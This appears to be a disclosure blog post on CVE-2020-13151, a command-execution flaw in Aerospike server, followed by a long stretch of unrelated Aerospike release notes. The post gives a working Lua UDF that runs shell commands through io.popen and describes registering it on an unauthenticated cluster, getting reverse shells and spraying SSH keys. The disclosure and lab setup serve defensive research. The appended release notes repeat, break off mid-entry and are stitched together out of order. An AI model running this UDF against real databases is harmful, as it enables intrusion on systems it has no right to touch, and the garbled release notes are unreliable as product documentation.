# An Aside

The Aerospike team was really great to work with on this CVE. They were very responsive and quickly developed a patch and worked it into production.

# Motivation

I recently disclosed CVE-2020-13151 to Aerospike after finding that I could execute commands against the underlying aerospike database hosts during an engagement. If you find an unpatched version of Aerospike server during testing, there may be a quick shell available. Depending on what else the hosts are used for this can be a good pivot point in the network.

# Prerequisites

* An unpatched (or non-hardened) version of the Aerospike server.
* Patches came in two stages:
  + Versions 5.0.0.7, 4.9.0.10, 4.8.0.13, 4.7.0.17, 4.6.0.19 and 4.5.3.21 received the ability to disable lua UDFs
  + Versions 5.1.0.3 and beyond blocked the process creation in the UDFs

Authentication is not offered on the community edition making the attack very simple on unpatched versions. I was unable to test this attack on the enterprise edition, so if you find one on an engagement, you’ll need to experiment a bit (and probably obtain some credentials).

# Exploiting

**tl;dr**
scripted exploit tool is here: <https://github.com/b4ny4n/CVE-2020-13151>

Again, this was only tested on the server community edition as I didn’t have access to the enterprise version. A nicety from an attacker point-of-view is that the community edition does not allow for authentication, making this attack very easy.

To show how it works, I’ll walk through a manual way to run the attack, though I’ve created a some tooling around it here [here](https://github.com/b4ny4n/CVE-2020-13151).

This attack is possible due to inusfficient blacklisting of functions in lua UDFs. Aerospike seems to have (sensibly) blocked `os.execute` calls during UDF execution, however the same precautions do not appear to be in place for `io.popen`.

Consider the following UDF, which when registered will allow us to execute and display the results of a command whichever host in the cluster ends up executing the function.

```
function runCMD(rec, cmd)
    local outtext = ""
    local phandle = io.popen(cmd)
    io.input(phandle)
    local foo = io.lines()
    for f in foo do
        outtext = outtext .. f .. "\n"
    end
    return outtext
end

```

Once connected to the cluster (again, no auth in the community edition), we can register our udf:
![](/screens/aero-register-udf.png)

Create a single-record test dataset to operate on:
![](/screens/aero-create-table.png)

And then execute commands on whichever host ended up hosting our record:
![](/screens/aero-execute-cmd.png)

In a large enough cluster an attacker could create a much larger dataset and repeatedly execute the commands against different records which would have the effect of spraying the command around the cluster (which would be fun for dropping ssh keys, for example).

# Try it out

I’ve written a tool which injects records into the target cluster and then executes the desired commands.

It can be used to obtain a reverse shell:

![](/screens/aero-revshell.png)

Or just to issue arbitrary commands:

![](/screens/aero-cmdexec.png)

You can grab the tool [here](https://github.com/b4ny4n/CVE-2020-13151) and experiment with it against a local docker setup:

```

# start up a single-node aerospike instance
docker run --rm -d --name aerospike -p 3000:3000 -p 3001:3001 -p 3002:3002 -p 3003:3003 aerospike:4.9.0.5

# if you want to issue commands against the server interactively,
# fire up a client to interact with the server (also dockerized)
# changing the --host IP as necessary
docker run -v `pwd`:/share -ti --name aerospike-aql --rm aerospike/aerospike-tools aql --host 172.17.0.2 --no-config-file

```
# If You’re Defending

Patch and firewall off backend servers if you’re on the community edition (ideally, they should only respond to the web apps fronting them). If you’re on the enterprise version, ensure you have strong authentication and minimize permission and access.

* [6.0.0.22](#6.0.0.22)

  **Release Date:** August 30, 2023
  + **This General Availability release 6.0.0.22 contains all hotfixes deployed during the release candidate cycle.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Bug Fixes

  + Enterprise & Federal Only
    - [AER-6665] - (XDR) Batched durable deletes will cause a crash if DC namespace context configuration item [`ship-bin-luts`](https://docs.aerospike.com/reference/configuration#ship-bin-luts) is set.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.
  + If your secondary index query only returns 0 records or 1 record, meaning that it is acting as a unique index, you should consider converting such a query to a get/exists operation by creating a self-managed reverse index (lookup table).
  + Spark Connector version 3.5 starts using batch writes when possible, a feature which was introduced in Aerospike server version 6.0. Consult the Spark Connector [rate limiting documentation](https://docs.aerospike.com/connect/spark/rate-limiting#set-rate-quotas-in-the-spark-application) before you upgrade the server. Pay attention to throttling write throughput, and use Spark Connector 3.5.5 or later, which fixes throttling behavior to conform to the `aerospike.transaction.rate`.

  #### Updates

  + **aerospike-tools** [8.0.4](https://download.aerospike.com/download/tools/notes.html#8.0.4)
* [6.0.0.17](#6.0.0.17)

  **Release Date:** May 16, 2023
  + **This General Availability release 6.0.0.17 contains all hotfixes deployed during the release candidate cycle.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Updates

  + **aerospike-tools** [8.0.4](https://download.aerospike.com/download/tools/notes.html#8.0.4)
* [6.0.0.10](#6.0.0.10)

  **Release Date:** December 15, 2022
  + **This General Availability release 6.0.0.10 contains all hotfixes deployed during the release candidate cycle.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  + **This General Availability release 6.0.0.4 contains all hotfixes deployed during the release candidate cycle.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Improvements

  + Enterprise & Federal Only
    - [AER-6562] - (SINDEX) For [`index-type flash`](https://docs.aerospike.com/reference/configuration#index-type), adjust secondary index(es) directly on non-durable deletes, instead of relying on garbage collection. [Note: this introduced an issue fixed in AER-6567.]

  #### Bug Fixes

  + Enterprise, Federal & Community
    - [AER-6564] - (CDT) A context operation on a CDT with top-level list which changes the CDT size such that it crosses a 256, 64K, or 1M byte boundary may cause a crash.
    - [AER-6563] - (EXPRESSIONS) For namespaces with data not in memory, a client-provided object used as a bin in a call may cause a crash.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.
  + If your secondary index query only returns 0 records or 1 record, meaning that it is acting as a unique index, you should consider converting such a query to a get/exists operation by creating a self-managed reverse index (lookup table).
  + Spark Connector version 3.5 starts using batch writes when possible, a feature which was introduced in Aerospike server version 6.0. Consult the Spark Connector [rate limiting documentation](https://docs.aerospike.com/connect/spark/rate-limiting#set-rate-quotas-in-the-spark-application) before you upgrade the server. Pay attention to throttling write throughput, and use Spark Connector 3.5.5 or later, which fixes throttling behavior to conform to the `aerospike.transaction.rate`.

  #### Bug Fixes

  + Enterprise, Federal & Community
    - [AER-6555] - (UDF) For namespaces with data not in memory, a UDF that writes multiple bins and would exceed [`write-block-size`](https://docs.aerospike.com/reference/configuration#write-block-size) may cause a crash.
  + Enterprise & Federal Only
    - [AER-6553] - (XDR) A source node may never discover all destination nodes if it starts with partial visibility of the remote cluster.
    - [AER-6554] - (MIGRATION) For [`strong-consistency`](https://docs.aerospike.com/reference/configuration#strong-consistency) namespaces, a failed appeal may block a node from starting migrations.

  **Release Date:** April 20, 2022
  + **This is a Developer Preview Release.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:

  #### Bug Fixes

  + Enterprise, Federal & Community
    - [AER-6526] - (SINDEX) Truncating a namespace or set with a secondary index, and more than 2 billion records per node, may overflow a garbage collection queue and crash.
  + Enterprise & Federal Only
    - [AER-6527] - (XDR) Dynamically removing seed nodes while trying to connect may cause connections to be skipped or cause a crash.

  #### Known Issues

  + If you use `equality` secondary index queries that return a small number of records, you may see a latency increase in server releases 6.0-6.2. The [`inline-short-queries`](https://docs.aerospike.com/server/reference/configuration#inline-short-queries) configuration option provides a partial fix in server 6.3, and a more advanced fix is scheduled for server 6.4.
  + If your secondary index query only returns 0 records or 1 record, meaning that it is acting as a unique index, you should consider converting such a query to a get/exists operation by creating a self-managed reverse index (lookup table).
  + Spark Connector version 3.5 starts using batch writes when possible, a feature which was introduced in Aerospike server version 6.0. Consult the Spark Connector [rate limiting documentation](https://docs.aerospike.com/connect/spark/rate-limiting#set-rate-quotas-in-the-spark-application) before you upgrade the server. Pay attention to throttling write throughput, and use Spark Connector 3.5.5 or later, which fixes throttling behavior to conform to the `aerospike.transaction.rate`.

  #### Updates

  + **aerospike-tools** [7.0.2](https://download.aerospike.com/download/tools/notes.html#7.0.2)
* [6.0.0.0-rc6](#6.0.0.0-rc6)

  **Release Date:** April 11, 2022
  + **This is a Developer Preview Release.**
  + **When upgrading to server version 6.0, you must either trim or wipe (zeroize) the Aerospike header on the devices.** A modified record storage format was introduced by AER-6513, which adds protection against partially written records during an unclean shutdown.
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/server/operations/upgrade/special_upgrades).
  + BREAKING CHANGE: The `truncate` privilege is now a separate privilege and is no longer under `write`.
  + The batch operations capability has been made comprehensive. We now fully support batch reads, writes, deletes, and UDF commands.
  + The previously deprecated Predicate Expression API has been removed. Use [Aerospike Filter Expressions](https://docs.aerospike.com/server/guide/expressions) (added in version 5.2).
  + Service context configuration [`paxos-single-replica-limit`](https://docs.aerospike.com/reference/configuration#paxos-single-replica-limit) has been removed.
  + Configurations, Metrics, and Server Logs related to Scans are now referred to as Primary Index Queries (pi queries). For example, scan\_basic\_complete is now referred to as pi\_query\_long\_basic\_complete.
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list` and the deprecated `scan-show` command.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill` and the deprecated `scan-abort` command.
  + The [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration parameter has been removed.
  + A number of [`Best Practices`](https://docs.aerospike.com/server/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + Several configuration parameters have been renamed or removed. Please refer to [`Config, Metrics, and Info Changes in Aerospike Database 6.0`](https://developer.aerospike.com/blog/config-metric-info-changes-in-database-6).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

* [5.7.0.10](#5.7.0.10)

  **Release Date:** January 13, 2022
  + For upgrading, or the unlikely event of downgrading, please refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + The Predicate Expression API is obsolete. The Aerospike Server and Client have scheduled removal with our next major Aerospike Server release. Use [Aerospike Filter Expressions](https://docs.aerospike.com/guide/expressions) (added in version 5.2).
  + The [`jobs`](https://docs.aerospike.com/reference/info#jobs) info command is now officially deprecated and will continue to be supported through a deprecation period, after which it will be removed. [`jobs`](https://docs.aerospike.com/reference/info#jobs) are now redundant with the new secondary index building methods and the following new info commands:
    - [`scan-show`](https://docs.aerospike.com/reference/info#scan-show) replaces `scan-list`.
    - [`query-show`](https://docs.aerospike.com/reference/info#query-show) replaces `query-list`.
    - [`query-abort`](https://docs.aerospike.com/reference/info#query-abort) replaces `query-kill`.
  + The configuration parameter [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests), now defaults to true, is deprecated and will be removed in six months. Customers using clients older than a year (around the time of Server 4.9 which introduced [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests)) will now have to explicitly set the [`batch-without-digests`](https://docs.aerospike.com/reference/configuration#batch-without-digests) configuration item to false.
  + A number of [`Best Practices`](https://docs.aerospike.com/operations/install/linux/bestpractices) will be checked at startup. The Best Practices can be enforced by enabling the new [`enforce-best-practices`](https://docs.aerospike.com/reference/configuration#enforce-best-practices) configuration item.
  + The security context configuration items [`enable-security`](https://docs.aerospike.com/reference/configuration#enable-security) and [`enable-ldap`](https://docs.aerospike.com/reference/configuration#enable-ldap) have been removed. The Server will not start if either [`enable-security`](https://docs.aerospike.com/reference/configuration#enable-security) or [`enable-ldap`](https://docs.aerospike.com/reference/configuration#enable-ldap) is present in the configuration file.
  + Security will now be enabled simply by the presence of the security { } section in the configuration file. Similarly, LDAP will now be enabled simply by the presence of the ldap { } section within the security { } section of the configuration file.
  + To use XDR with ACL [`auth-mode`](https://docs.aerospike.com/reference/configuration#auth-mode) must be explicitly configured.

  + **aerospike-tools** [6.1.0](https://download.aerospike.com/download/tools/notes.html#6.1.0)
* [5.6.0.25](#5.6.0.25)

  **Release Date:** October 3, 2022
  + The older Aerospike Connect Outbound versions do not work with Aerospike Server version 5.6 or newer. If you are using Aerospike Connect Outbound, you should upgrade respectively to:
    - Aerospike Connect for JMS - Outbound version 3.0.0 or newer
    - Aerospike Connect for Kafka - Outbound version 4.0.0 or newer
    - Aerospike Connect for Pulsar - Outbound version 2.0.0 or newer
    - XDR Proxy version 1.1.0 or newer
  + In Aerospike Server 5.5 or earlier, a UDF returning a Boolean value as a bin would be converted to 1 or 0. In Aerospike 5.6 or newer the value returns as true or false.
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + As of Aerospike Server 4.9 scans are correct. The scan priority, fail\_on\_cluster\_change, and scan percent options, that were deprecated in Aerospike Server 4.9 are removed in Aerospike Server 5.6.
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
    - For evictions, the relevant [`high-water-disk-pct`](https://docs.aerospike.com/reference/configuration#high-water-disk-pct)/[`high-water-memory-pct`](https://docs.aerospike.com/reference/configuration#high-water-memory-pct)/[`mounts-high-water-pct`](https://docs.aerospike.com/reference/configuration#mounts-high-water-pct) must be configured (new defaults are 0).
    - For details refer to the [`Namespace Retention Configuration`](https://docs.aerospike.com/operations/configure/namespace/retention) documentation.
  + The Predicate Expression API will be removed in the Aerospike Server version 6.0 release. Use [Aerospike Filter Expressions](https://docs.aerospike.com/guide/expressions) (added in version 5.2).
  + We have removed support for Ubuntu 16.04.
    - For more information please refer to: [Ubuntu 16.04 LTS (Xenial Xerus)](https://ubuntu.com/16-04).
  + Use [Prometheus Exporter](https://aerospike.com/download/monitoring/aerospike-prometheus-exporter/notes.html) version 1.2.1 or later to run Prometheus Exporter with this version of Aerospike Server.

  #### Bug Fixes

  + Enterprise & Federal Only
    - [AER-6569] - (INFO) A [`cluster-stable`](https://docs.aerospike.com/reference/info#cluster-stable) command without a 'namespace' parameter will not check for unavailable and dead partitions.
    - [AER-6571] - (UDF) The [`record.numbins()`](https://developer.aerospike.com/udf/api/record#recordnumbins) and [`record.bin_names()`](https://developer.aerospike.com/udf/api/record#recordbin_names) functions erroneously include bin tombstones.

  **Release Date:** March 30, 2022
  + The older Aerospike Connect Outbound versions do not work with Aerospike Server version 5.6 or newer. If you are using Aerospike Connect Outbound, you should upgrade respectively to:
    - Aerospike Connect for JMS - Outbound version 3.0.0 or newer
    - Aerospike Connect for Kafka - Outbound version 4.0.0 or newer
    - Aerospike Connect for Pulsar - Outbound version 2.0.0 or newer
    - XDR Proxy version 1.1.0 or newer
  + In Aerospike Server 5.5 or earlier, a UDF returning a Boolean value as a bin would be converted to 1 or 0. In Aerospike 5.6 or newer the value returns as true or false.
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).

(Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.

    - Aerospike Connect for JMS - Outbound version 3.0.0 or newer
    - Aerospike Connect for Kafka - Outbound version 4.0.0 or newer
    - Aerospike Connect for Pulsar - Outbound version 2.0.0 or newer
    - XDR Proxy version 1.1.0 or newer
  + In Aerospike Server 5.5 or earlier, a UDF returning a Boolean value as a bin would be converted to 1 or 0. In Aerospike 5.6 or newer the value returns as true or false.
  + Downgrading from Aerospike Database version 5.5 or newer to version 5.4 or version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.4 to version 5.3 or version 5.2 (where XDR bin convergence has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + Downgrading from Aerospike Database version 5.2 or newer to a version previous to 5.2 (where XDR bin shipping has been used). Refer to [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades).
  + ATTENTION: Debian/Ubuntu users - if python2 is not installed, see the [Python Package Dependency for .deb Installers](https://discuss.aerospike.com/t/python-package-dependency-for-debian-deb-based-aerospike-tools-installers/7939) article.
  + Support for the XDR [`bin-policy`](https://docs.aerospike.com/reference/configuration#bin-policy) value 'only-specified', has been removed. Users of 'only-specified' will likely want to switch to 'changed-and-specified'.
    - Refer to the [Special Upgrades - Upgrading from 5.0 or 5.1 to 5.3 or newer - if using the XDR bin projection functionality](https://docs.aerospike.com/operations/upgrade/special_upgrades/bin_projection_upgrade) documentation.â¨
  + Aerospike Server version 5.1 or later requires the operating system distribution's **libcurl** shared object library.
  + Before upgrading to 5.0.0.4 or later, customers already running 5.0.0.3 in a cluster which is an active XDR destination (i.e. an XDR destination also acting as a source XDR or that may in the future act as a source XDR), may want to consider stopping all XDR traffic to the cluster. (Enterprise Only)
    - In the unlikely case of an upgraded 5.0.0.4 or newer node going down while 5.0.0.3 nodes are still running, those nodes would mistakenly ship XDR writes even if `forward` has not been explicitly enabled.
    - Enterprise Licensees may contact Aerospike Support for any questions before upgrading.
  + Cross-Datacenter Replication (XDR) running in Aerospike Server version 5.0 or newer can only connect to XDR destination clusters running versions 4.1 or newer.
  + **All nodes must be upgraded to Aerospike Server version 4.9.0.7 or newer. Please upgrade to the latest 4.9.0.x release** prior to upgrading to Aerospike Server version 5.0 or newer.
    - Aerospike Server version 5.0 or newer **will not** form a cluster with version 4.8 nodes or earlier.
    - When upgrading the Aerospike Server refer to the [Special Upgrades](https://docs.aerospike.com/operations/upgrade/special_upgrades) documentation.
  + The Aerospike Server **will not start** if obsolete configuration parameters are set in the Aerospike configuration file (aerospike.conf).
    - Refer to: [Configuration parameters that must be removed for Aerospike Server version 5.0 or newer](https://docs.aerospike.com/operations/upgrade/special_upgrades/50_removed_parameters)
  + As of Aerospike Server 4.9 scans are correct. The scan priority, fail\_on\_cluster\_change, and scan percent options, that were deprecated in Aerospike Server 4.9 are removed in Aerospike Server 5.6.
  + **ATTENTION:** As of Aerospike Server version 4.9, expirations and evictions are disabled by default.
    - For expirations, [`nsup-period`](https://docs.aerospike.com/reference/configuration#nsup-period) must be configured (new default is 0).
